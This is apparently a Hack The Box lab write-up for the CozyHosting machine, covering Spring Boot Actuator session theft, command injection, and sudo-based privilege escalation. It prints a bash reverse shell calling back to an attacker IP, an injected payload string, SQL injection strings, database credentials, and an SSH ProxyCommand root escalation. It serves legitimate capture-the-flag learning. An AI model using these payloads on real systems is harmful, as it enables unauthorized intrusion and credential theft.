# CozyHosting - HTB Labs Writeup

**Machine:** CozyHosting (Linux)
**Difficulty:** Easy


<img width="1029" height="214" alt="1" src="https://github.com/user-attachments/assets/5087c1d7-ce76-4451-9f5f-66973a176efa" />

## Background / Scope
**Target:** `10.10.11.230`

**Goal:** Obtain `user.txt` and `root.txt` (or `Root` access) on the machine in a lab environment.

**Machine Info:** CozyHosting is an easy-difficulty Linux machine that features a `Spring Boot` application. The application has the `Actuator` endpoint enabled. Enumerating the endpoint leads to the discovery of a user&amp;#039;s session cookie, leading to authenticated access to the main dashboard. The application is vulnerable to command injection, which is leveraged to gain a reverse shell on the remote machine. Enumerating the application&amp;#039;s `JAR` file, hardcoded credentials are discovered and used to log into the local database. The database contains a hashed password, which once cracked is used to log into the machine as the user `josh`. The user is allowed to run `ssh` as `root`, which is leveraged to fully escalate privileges.

## Target Enumeration (nmap)

First, I'll run nmap scanning to find what services are running on this machine

```python
└─# nmap -sC -sV 10.10.11.230
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 04:15 EST
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.62s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.31 seconds
```

`SSH(22)` and `HTTP(80)` are running on this machine.Let's add our domain name `cozyhosting.htb` :

```text
10.10.11.230     cozyhosting.htb
```

Now we can open up this website.




<img width="1218" height="549" alt="2" src="https://github.com/user-attachments/assets/5b03b7e5-c65d-4fac-8ff7-35c79d2b4687" />

We see login page `/login`


<img width="471" height="487" alt="3" src="https://github.com/user-attachments/assets/f8ecf719-64d9-4f33-8995-2118c74331c6" />

I tried default username and password, It showed me `Invalid password or username` error


<img width="350" height="413" alt="4" src="https://github.com/user-attachments/assets/870f14b2-6e16-42b6-8d63-478b3d0fcddf" />

Also I tried `sql injection` payloads `' OR 1=1-- -` or `' OR '1'='1` but It fails


## Directory Brute Force 

I'll run simple directory brute forcing using `feroxbuster`

```python
feroxbuster -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cozyhosting.htb/
 🚩  In-Scope Url          │ cozyhosting.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      285l      745w    12706c http://cozyhosting.htb/index
200      GET       97l      196w     4431c http://cozyhosting.htb/login
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/favicon.png
200      GET       29l      131w    11970c http://cozyhosting.htb/assets/img/pricing-free.png
200      GET        1l      313w    14690c http://cozyhosting.htb/assets/vendor/aos/aos.js
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/logo.png
200      GET       34l      172w    14934c http://cozyhosting.htb/assets/img/pricing-starter.png
200      GET       29l      174w    14774c http://cozyhosting.htb/assets/img/pricing-ultimate.png
200      GET      295l      641w     6890c http://cozyhosting.htb/assets/js/main.js
200      GET       43l      241w    19406c http://cozyhosting.htb/assets/img/pricing-business.png
200      GET       83l      453w    36234c http://cozyhosting.htb/assets/img/values-3.png
200      GET       73l      470w    37464c http://cozyhosting.htb/assets/img/values-1.png
200      GET       81l      517w    40968c http://cozyhosting.htb/assets/img/hero-img.png
200      GET       79l      519w    40905c http://cozyhosting.htb/assets/img/values-2.png
200      GET        1l      218w    26053c http://cozyhosting.htb/assets/vendor/aos/aos.css
200      GET     2397l     4846w    42231c http://cozyhosting.htb/assets/css/style.css
200      GET        1l      625w    55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js
200      GET        7l     1222w    80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET       14l     1684w   143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js
200      GET        7l     2189w   194901c http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css
200      GET     2018l    10020w    95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css
200      GET      285l      745w    12706c http://cozyhosting.htb/
401      GET        1l        1w       97c http://cozyhosting.htb/admin
204      GET        0l        0w        0c http://cozyhosting.htb/logout
```

I found different directories but when I try open `/error` directory, It shows me interesing error `Whitebale Error Page(SpringBoot)`


<img width="776" height="209" alt="5" src="https://github.com/user-attachments/assets/0b5a267d-8fd9-4916-b191-d310216a9cac" />


I didn't find interesting from these finding directories.So I'll try use different list for `SprintBoot` [list](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt) is it

```python
┌──(root㉿odinaev)-[/home/odinaev/Downloads]
└─# feroxbuster -u http://cozyhosting.htb -w Java-Spring-Boot.txt 
                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cozyhosting.htb/
 🚩  In-Scope Url          │ cozyhosting.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ Java-Spring-Boot.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        1w      634c http://cozyhosting.htb/actuator
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/pwd
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/path
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/hostname
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/home
200      GET        1l      120w     4957c http://cozyhosting.htb/actuator/env
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/tz
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/spring.jmx.enabled
200      GET        1l        1w       15c http://cozyhosting.htb/actuator/health
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/lang
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/language
200      GET        1l        1w       48c http://cozyhosting.htb/actuator/sessions
200      GET       34l      172w    14934c http://cozyhosting.htb/assets/img/pricing-starter.png
200      GET      295l      641w     6890c http://cozyhosting.htb/assets/js/main.js
200      GET       43l      241w    19406c http://cozyhosting.htb/assets/img/pricing-business.png
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/logo.png
200      GET       97l      196w     4431c http://cozyhosting.htb/login
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/favicon.png
200      GET       29l      174w    14774c http://cozyhosting.htb/assets/img/pricing-ultimate.png
200      GET       29l      131w    11970c http://cozyhosting.htb/assets/img/pricing-free.png
200      GET        1l      313w    14690c http://cozyhosting.htb/assets/vendor/aos/aos.js
200      GET        1l      108w     9938c http://cozyhosting.htb/actuator/mappings
200      GET       79l      519w    40905c http://cozyhosting.htb/assets/img/values-2.png
200      GET       73l      470w    37464c http://cozyhosting.htb/assets/img/values-1.png
200      GET       83l      453w    36234c http://cozyhosting.htb/assets/img/values-3.png
200      GET       81l      517w    40968c http://cozyhosting.htb/assets/img/hero-img.png
401      GET        1l        1w       97c http://cozyhosting.htb/admin
200      GET        1l      218w    26053c http://cozyhosting.htb/assets/vendor/aos/aos.css
200      GET       14l     1684w   143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js
200      GET        7l     1222w    80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET        1l      625w    55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js
200      GET     2397l     4846w    42231c http://cozyhosting.htb/assets/css/style.css
200      GET        1l      542w   127224c http://cozyhosting.htb/actuator/beans
200      GET     2018l    10020w    95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css
200      GET        7l     2189w   194901c http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css
200      GET      285l      745w    12706c http://cozyhosting.htb/
[####################] - 9s       261/261     0s      found:34      errors:0      
[####################] - 9s       203/203     23/s    http://cozyhosting.htb/                                                                                                                               
┌──(root㉿odinaev)-[/home/odinaev/Downloads]
└─# feroxbuster -u http://cozyhosting.htb/actuator -w Java-Spring-Boot.txt
                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cozyhosting.htb/actuator
 🚩  In-Scope Url          │ cozyhosting.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ Java-Spring-Boot.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        1w      634c http://cozyhosting.htb/actuator
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/language
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/hostname
200      GET        1l      120w     4957c http://cozyhosting.htb/actuator/env
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/lang
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/path
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/tz
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/home
200      GET        1l        1w       15c http://cozyhosting.htb/actuator/health
404      GET        0l        0w        0c http://cozyhosting.htb/actuator/env/pwd
200      GET        1l        1w      148c http://cozyhosting.htb/actuator/sessions
200      GET        1l      108w     9938c http://cozyhosting.htb/actuator/mappings
200      GET        1l      542w   127224c http://cozyhosting.htb/actuator/beans
[####################] - 9s       226/226     0s      found:11      errors:0      
[####################] - 9s       203/203     24/s    http://cozyhosting.htb/actuator/
```

I found very interesting directory `/actuator/mappings`

📌 What is /actuator/mappings?

/actuator/mappings is an endpoint in Spring Boot that shows a full map of the application’s routes. It lists:
	•	all available controllers
	•	their URL paths
	•	the HTTP methods they use (GET, POST, etc.)
	•	the classes and functions handling each route
	•	any filters or interceptors applied to them

In short, it provides a clear overview of every route inside the application.




<img width="1273" height="651" alt="6" src="https://github.com/user-attachments/assets/007ecb47-2195-4158-8ad6-e0524fed2091" />

To find any interesting data, I try to enumerate with `curl` command


```text
curl -s 'http://cozyhosting.htb/actuator/mappings' | jq
```

<img width="1267" height="602" alt="7" src="https://github.com/user-attachments/assets/e87c347f-4140-4ffc-a6d7-a3bbdc33e415" />


[This page](https://docs.spring.io/spring-boot/docs/3.2.0-SNAPSHOT/actuator-api/htmlsingle/) helps me for enumeration `/actuator/mappings`


```python
└─# curl -s 'http://cozyhosting.htb/actuator/mappings' | jq '.contexts.application.mappings.dispatcherServlets
.dispatcherServlet | .[] | [.handler, .predicate]'
[
  "Actuator web endpoint 'sessions'",
  "{GET [/actuator/sessions], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"
]
[
  "Actuator web endpoint 'health'",
  "{GET [/actuator/health], produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}"

  "htb.cloudhosting.compliance.ComplianceService#executeOverSsh(String, String, HttpServletResponse)",
  "{POST [/executessh]}"
]
[
  "ParameterizableViewController [view=\"admin\"]",
  "/admin"
]
[
  "ParameterizableViewController [view=\"addhost\"]",
  "/addhost"
]
[
  "ParameterizableViewController [view=\"index\"]",
  "/index"
]
[
  "ParameterizableViewController [view=\"login\"]",
  "/login"
]
[
  "ResourceHttpRequestHandler [classpath [META-INF/resources/webjars/]]",
  "/webjars/**"
]
[
  "ResourceHttpRequestHandler [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]",
  "/**"
]
```

I found session `cookie` on `/actuator/sessions`

```text
└─# curl -s 'http://cozyhosting.htb/actuator/sessions' | jq                                                   
{
  "53F439447E7F9EBA5E8ACDF39181346C": "kanderson"
}
```

I'll paste this cookie on `Inspector` and reload `/login` page

<img width="1040" height="597" alt="8" src="https://github.com/user-attachments/assets/f32ad6c7-078d-4181-95b3-5c97c0d80345" />


We've succesfully got access

<img width="1264" height="588" alt="9" src="https://github.com/user-attachments/assets/6ee0fdf6-b782-4d19-b283-6a52fd76e530" />



## Command Injection


This part of this page looks interesting.When I tried `test;id` it showed my this:

<img width="1224" height="465" alt="11" src="https://github.com/user-attachments/assets/95ab6a89-3a70-4f8d-b397-a4bc559ca43b" />


This error message said `publice keys`, so on the server side it looks like this
```text
ssh -i [key] [username]@[hostname]
```
We found `Command Injection` vulnerability


## Shell as `App`


I created simple bash `reverse shell` and saved as `rev.sh` 

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.28/443 0>&1
```

I use command injection vuln to send this payload to this machine.`${IFS}` on bash variable is space

<img width="948" height="415" alt="13" src="https://github.com/user-attachments/assets/c5000ade-c8ff-4d64-a621-d32d9384a09c" />

```text
host=localhost&username=real%3bbash${IBS}/tmp/rev.sh
```

Now I'm listenning connection using netcat and run our payload on this machine.We got shell!

```python

 nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.28] from (UNKNOWN) [10.10.11.230] 40822
bash: cannot set terminal process group (1059): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ whoami
whoami
app
```

## Privilege Escalation

Using my privileges I can't even open user directory so I need to find the password of user.

```python
app@cozyhosting:/tmp$ cd /home                                                                                                                              
cd /home                                                                                                                                                    
app@cozyhosting:/home$ ls                                                                                                                                   
ls                                                                                                                                                          
josh                                                                                                                                                        
app@cozyhosting:/home$ cd josh                                                                                                                              
cd josh                                                                                                                                                     
bash: cd: josh: Permission denied                                                                                                                           
app@cozyhosting:/home$
```

I went back to `/app` directory and find `cloudhosting-0.0.1.jar` because of I can't unzip it, I just copied this file on `/tmp` directory and It worked.Too much files pops up.I try to find any credentials using this command


```text
grep -r password 2>/dev/null
```

<img width="1275" height="224" alt="15" src="https://github.com/user-attachments/assets/6c6c18a7-e829-4cac-a5d6-6cf5ead72ac9" />

As we can see `BOOT-INF/classes/application.properties` directory has the password.I'll try to open it

<img width="651" height="241" alt="16" src="https://github.com/user-attachments/assets/e3fd1d51-38b1-4f97-96a0-83247136a969" />

I found the creds for Postgres and I connect to this service using `psql`

```text
PGPASSWORD='Vg&nvzAQ7XxR' psql -U postgres -h localhost
```

We see some databases 

```python
\list
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

`Cozyhosting` db looks interesting to connect to this db I run `\c cozyhosting`
I found `hosts` and `users` tables

```text
\dt
 public | hosts | table | postgres
 public | users | table | postgres
```

I request all data from `users` table

```text
select * from users;
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

After cracking hash using `hashcat` with mode `3200` I found out password is `manchesterunited`
I SSH to this machine as `Josh`
```python
ssh josh@cozyhosting.htb
```

I obtained the `user.txt`
```python
josh@cozyhosting:~$ cat user.txt
2edbbd206a3ebd062***************
```


## Privilege Escalation


First of all to get root we need to check what `sudo` command I can run with no password require

```python
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```


🛠️ How to Get Root

The sudo -l output shows that the user josh can run /usr/bin/ssh as root with any arguments.
This allows command execution through `SSH’s -o ProxyCommand` 

You can spawn a root shell with:

```bash
sudo ssh -o ProxyCommand='sh -c "sh 0<&2 1>&2"'
```
And I got `root`


<img width="554" height="68" alt="18" src="https://github.com/user-attachments/assets/a5472a1b-4cb7-43de-9757-392a3e278c7e" />

Now I we got `root.txt`
```text
# cat root.txt
1e332bdbc8a96f62df4403d1402282c2
```

⭐ If you found this writeup helpful — consider giving a star on GitHub!











